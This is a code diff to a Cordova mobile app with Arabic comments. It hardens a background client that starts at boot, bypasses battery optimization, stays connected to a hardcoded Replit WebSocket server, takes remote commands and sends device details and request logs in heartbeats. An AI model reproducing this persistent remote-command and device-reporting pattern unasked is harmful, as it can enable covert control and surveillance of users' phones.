@@ -2,21 +2,35 @@ document.addEventListener('deviceready', onDeviceReady, false);
 
 // تخزين الطلبات المستلمة
 const receivedRequests = [];
-let deviceInfo = {};
-let heartbeatInterval;
 
 function onDeviceReady() {
   console.log('Device is ready');
   
-  // تمكين الخدمة الأمامية (Foreground Service)
+  // تمكين التشغيل في الخلفية
+  if (cordova.plugins.backgroundMode) {
+    cordova.plugins.backgroundMode.enable();
+    cordova.plugins.backgroundMode.setDefaults({
+      title: 'التطبيق يعمل في الخلفية',
+      text: 'جارٍ مراقبة الأوامر الواردة',
+      icon: 'ic_stat_icon'
+    });
+    
+    // منع إيقاف الخدمة في الخلفية
+    cordova.plugins.backgroundMode.on('activate', function() {
+      cordova.plugins.backgroundMode.disableWebViewOptimizations();
+    });
+  }
+
+  // تشغيل خدمة أمامية (Foreground Service)
   if (cordova.plugins.foregroundService) {
     try {
       cordova.plugins.foregroundService.start(
         'التطبيق يعمل', 
         'جارٍ مراقبة الأوامر في الخلفية', 
-        'ic_stat_icon'
+        'ic_stat_icon',
+        1234, // service id
+        1000 // interval
       );
-      console.log('Foreground service started');
     } catch (error) {
       console.error('Error starting foreground service:', error);
     }
@@ -27,28 +41,16 @@ function onDeviceReady() {
     try {
       cordova.plugins.autoStart.enable();
       cordova.plugins.autoStart.enableBootStart();
-      console.log('Auto start enabled');
     } catch (error) {
       console.error('Error enabling auto start:', error);
     }
   }
 
-  // تمكين التشغيل في الخلفية
-  if (cordova.plugins.backgroundMode) {
-    cordova.plugins.backgroundMode.enable();
-    cordova.plugins.backgroundMode.setDefaults({
-      title: 'التطبيق يعمل في الخلفية',
-      text: 'جارٍ مراقبة الأوامر الواردة'
-    });
-    
-    // إضافة مستمع للأحداث
-    cordova.plugins.backgroundMode.on('activate', function() {
-      console.log('Background mode activated');
-    });
-  }
+  // تجاوز تحسينات البطارية
+  requestBatteryOptimizationExemption();
 
   // معلومات الجهاز
-  deviceInfo = {
+  const deviceInfo = {
     uuid: device.uuid || generateUUID(),
     model: device.model || 'Unknown',
     platform: device.platform || 'Unknown',
@@ -89,51 +91,57 @@ function onDeviceReady() {
     connectToServer(deviceInfo);
   }
   
-  // طلب تجاوز تحسينات البطارية
-  requestBatteryOptimization();
-}
-
-function requestBatteryOptimization() {
-  if (cordova.plugins.backgroundMode) {
-    cordova.plugins.backgroundMode.disableBatteryOptimizations();
+  function updateBatteryInfo() {
+    navigator.getBattery().then(battery => {
+      deviceInfo.battery = {
+        level: Math.round(battery.level * 100),
+        charging: battery.charging,
+        chargingTime: battery.chargingTime,
+        dischargingTime: battery.dischargingTime
+      };
+      
+      // إرسال تحديث البطارية إلى الخادم
+      if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
+        window.wsConnection.send(JSON.stringify({
+          type: 'device_update',
+          deviceInfo: {
+            battery: deviceInfo.battery,
+            timestamp: new Date().toISOString()
+          }
+        }));
+      }
+    });
   }
 }
 
-function updateBatteryInfo() {
-  navigator.getBattery().then(battery => {
-    deviceInfo.battery = {
-      level: Math.round(battery.level * 100),
-      charging: battery.charging,
-      chargingTime: battery.chargingTime,
-      dischargingTime: battery.dischargingTime
-    };
-    
-    // إرسال تحديث البطارية إلى الخادم
-    if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
-      window.wsConnection.send(JSON.stringify({
-        type: 'device_update',
-        deviceInfo: {
-          battery: deviceInfo.battery,
-          timestamp: new Date().toISOString()
-        }
-      }));
-    }
-  });
+// تجاوز تحسينات البطارية
+function requestBatteryOptimizationExemption() {
+  if (cordova.plugins.batteryOptimization) {
+    cordova.plugins.batteryOptimization.isIgnoringBatteryOptimizations(function(ignoring) {
+      if (!ignoring) {
+        cordova.plugins.batteryOptimization.requestOptOut(function() {
+          console.log('تم تجاوز تحسينات البطارية');
+        }, function(error) {
+          console.error('خطأ في تجاوز تحسينات البطارية:', error);
+          // توجيه المستخدم يدويًا إذا فشل التلقائي
+          showBatteryOptimizationDialog();
+        });
+      }
+    });
+  } else {
+    showBatteryOptimizationDialog();
+  }
+}
+
+// إظهار حوار توجيه المستخدم لتعطيل تحسينات البطارية
+function showBatteryOptimizationDialog() {
+  // يمكن إضافة تنبيه يوجه المستخدم لتعطيل تحسينات البطارية يدويًا
+  console.log('يرجى تعطيل تحسينات البطارية للتطبيق من إعدادات الجهاز');
 }
 
 function connectToServer(deviceInfo) {
   // استخدام رابط الخادم المقدم
   const wsUrl = 'wss://0c0d4d48-f2d0-4f6b-9a7c-dfaeba1f204e-00-1fpda24jsv608.sisko.replit.dev';
-  
-  // إغلاق الاتصال الحالي إذا كان موجوداً
-  if (window.wsConnection) {
-    try {
-      window.wsConnection.close();
-    } catch (e) {
-      console.log('Error closing existing connection:', e);
-    }
-  }
-  
   window.wsConnection = new WebSocket(wsUrl);
   
   wsConnection.onopen = () => {
@@ -145,9 +153,6 @@ function connectToServer(deviceInfo) {
       deviceId: deviceInfo.uuid,
       deviceInfo
     }));
-    
-    // بدء إرسال النبضات القلبية
-    startHeartbeat(deviceInfo);
   };
   
   wsConnection.onmessage = (event) => {
@@ -192,30 +197,17 @@ function connectToServer(deviceInfo) {
   wsConnection.onclose = () => {
     console.log('Disconnected from server');
     // إعادة الاتصال بعد تأخير
-    setTimeout(() => connectToServer(deviceInfo), 10000);
+    setTimeout(() => connectToServer(deviceInfo), 5000);
   };
-}
-
-function startHeartbeat(deviceInfo) {
-  // إيقاف أي نبضات قلبية سابقة
-  if (heartbeatInterval) {
-    clearInterval(heartbeatInterval);
-  }
   
   // إرسال نبضات قلبية دورية
-  heartbeatInterval = setInterval(() => {
-    if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
-      // تحديث معلومات البطارية قبل الإرسال
-      updateBatteryInfo();
-      
-      window.wsConnection.send(JSON.stringify({ 
+  const heartbeatInterval = setInterval(() => {
+    if (wsConnection && wsConnection.readyState === WebSocket.OPEN) {
+      wsConnection.send(JSON.stringify({ 
         type: 'heartbeat',
         timestamp: new Date().toISOString(),
         receivedRequests, // إرسال سجل الطلبات المستلمة
-        deviceInfo: {
-          ...deviceInfo,
-          battery: deviceInfo.battery // تضمين أحدث حالة للبطارية
-        }
+        deviceId: deviceInfo.uuid
       }));
     }
   }, 30000);
@@ -438,13 +430,17 @@ function getReceivedRequests(commandId, callback) {
 
 // إعادة الاتصال عند استئناف التطبيق
 document.addEventListener('resume', () => {
-  console.log('App resumed, reconnecting...');
   if (window.wsConnection && window.wsConnection.readyState !== WebSocket.OPEN) {
-    connectToServer(deviceInfo);
+    console.log('App resumed, reconnecting...');
+    onDeviceReady();
   }
 }, false);
 
-// معالجة إعادة تشغيل الجهاز
+// التعامل مع إيقاف التطبيق
 document.addEventListener('pause', () => {
-  console.log('App paused, but will continue running in background');
+  console.log('App paused, keeping connection alive');
+  // الحفاظ على الاتصال حتى في حالة الإيقاف
+  if (cordova.plugins.backgroundMode) {
+    cordova.plugins.backgroundMode.moveToBackground();
+  }
 }, false);
